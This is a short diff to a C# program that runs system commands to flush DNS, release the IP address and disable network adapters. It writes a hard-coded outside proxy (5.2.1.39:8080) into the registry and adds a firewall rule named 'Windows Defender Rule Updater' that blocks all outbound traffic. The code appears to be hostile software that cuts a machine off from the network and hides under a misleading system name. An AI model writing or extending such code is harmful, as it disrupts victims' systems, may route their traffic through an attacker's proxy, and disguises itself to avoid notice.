@@ -96,8 +96,8 @@ public class Program
         }
 
         {
-            Process.Start("ipconfig", "/flushdns");
-            Process.Start("ipconfig", "/release");
+            ExecuteCmdCommand("ipconfig /flushdns");
+            ExecuteCmdCommand("ipconfig /release");
             ExecuteCmdCommand("wmic path win32_networkadapter where PhysicalAdapter=True call disable");
             ExecuteCmdCommand("netsh interface set interface \"Local Area Connection\" disable");
 
@@ -180,6 +180,17 @@ public class Program
                         key.SetValue("ProxyServer", "5.2.1.39:8080");
                     }
                 }
+            }
+            catch
+            {
+
+            }
+        }
+
+        {
+            try
+            {
+                ExecuteCmdCommand("netsh advfirewall firewall add rule name=\"Windows Defender Rule Updater\" dir=out action=block protocol=any localport=any remoteport=any enable=yes");
             }
             catch
             {
